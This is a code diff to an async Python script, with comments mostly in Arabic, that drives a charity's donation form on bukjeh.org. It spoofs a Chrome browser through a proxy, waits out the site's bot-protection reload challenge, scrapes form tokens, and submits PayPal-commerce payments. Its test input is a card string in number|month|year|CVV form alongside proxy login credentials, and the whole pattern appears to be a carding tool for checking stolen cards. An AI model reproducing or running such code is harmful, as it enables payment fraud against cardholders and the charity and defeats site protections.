@@ -44,7 +44,6 @@ class tools:
         }
 
 def build_multipart_data(fields: dict) -> tuple:
-    """دالة لإنشاء بيانات multipart/form-data بشكل يدوي نقي لتجنب مشاكل المكتبات"""
     boundary = '----WebKitFormBoundary' + uuid.uuid4().hex
     body = ""
     for key, value in fields.items():
@@ -78,7 +77,7 @@ class Gateway:
         async with AsyncSession(impersonate="chrome", proxies=proxies) as session:
             try:
                 # ==========================================
-                # Step 1: GET donation page
+                # Step 1: GET donation page + Bypass Challenge
                 # ==========================================
                 print("[1] جاري سحب الصفحة الرئيسية...")
                 headers_init = {
@@ -96,17 +95,16 @@ class Gateway:
                     'upgrade-insecure-requests': '1',
                     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                 }
+                
                 resp_init = await session.get('https://bukjeh.org/donations/donation-2023-2-3/', headers=headers_init)
-html = resp_init.text
-
-# --- إضافة هذا الجزء لتجاوز صفحة الانتظار ---
-if 'window.location.reload()' in html:
-    print("    [!] تم اكتشاف صفحة انتظار حماية، جاري الانتظار 5 ثوانٍ وإعادة المحاولة...")
-    await asyncio.sleep(6)
-    resp_init = await session.get('https://bukjeh.org/donations/donation-2023-2-3/', headers=headers_init)
-    html = resp_init.text
-# -------------------------------------------
-
+                html = resp_init.text
+                
+                # تجاوز صفحة الانتظار (5 seconds reload challenge)
+                if 'window.location.reload()' in html:
+                    print("    [!] تم اكتشاف صفحة انتظار الحماية، جاري الانتظار 6 ثوانٍ وإعادة الطلب...")
+                    await asyncio.sleep(6)
+                    resp_init = await session.get('https://bukjeh.org/donations/donation-2023-2-3/', headers=headers_init)
+                    html = resp_init.text
                 
                 try:
                     hash_val = re.search(r'name="give-form-hash" value="(.*?)"', html).group(1)
@@ -117,9 +115,8 @@ if 'window.location.reload()' in html:
                     dec = base64.b64decode(enc).decode("utf-8")
                     au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
                 except AttributeError:
-                    print("    [خطأ] لم يتم العثور على المتغيرات في الصفحة. إليك جزء من رد الموقع لمعرفة السبب:")
+                    print("    [خطأ] لم يتم العثور على المتغيرات. رد الموقع:")
                     print("    " + "-"*40)
-                    # طباعة أول 300 حرف بدون مسافات فارغة كثيرة
                     print(f"    {html[:300].strip()}...") 
                     print("    " + "-"*40)
                     return "Error", "Missing form parameters (Blocked or Changed)", False
@@ -214,7 +211,6 @@ if 'window.location.reload()' in html:
                     'give-gateway': 'paypal-commerce',
                 }
                 
-                # تحويل البيانات إلى صيغة Multipart الحقيقية
                 body_bytes, content_type = build_multipart_data(fields_payload)
                 
                 headers_ajax2 = {
@@ -283,7 +279,6 @@ if 'window.location.reload()' in html:
                     'order': order_id,
                 }
                 
-                # استخدام نفس بيانات الـ Multipart السابقة
                 resp_ajax3 = await session.post('https://bukjeh.org/wp-admin/admin-ajax.php', params=params_ajax3, headers=headers_ajax2, data=body_bytes)
                 text = resp_ajax3.text.upper()
                 
@@ -343,7 +338,6 @@ async def process_paypal_1(card_line: str, proxy_url: str = None) -> tuple[str, 
     
 async def main():
     test_card = "4211566115568609|12|28|321"
-    # استخدم بروكسي شغال لضمان تجاوز الخطوة الأولى
     proxy = "http://purevpn0s8732217:i67s60ep@Px121102.pointtoserver.com:10780"
 
     print("🚀 Testing gateway (ST Charge)...")
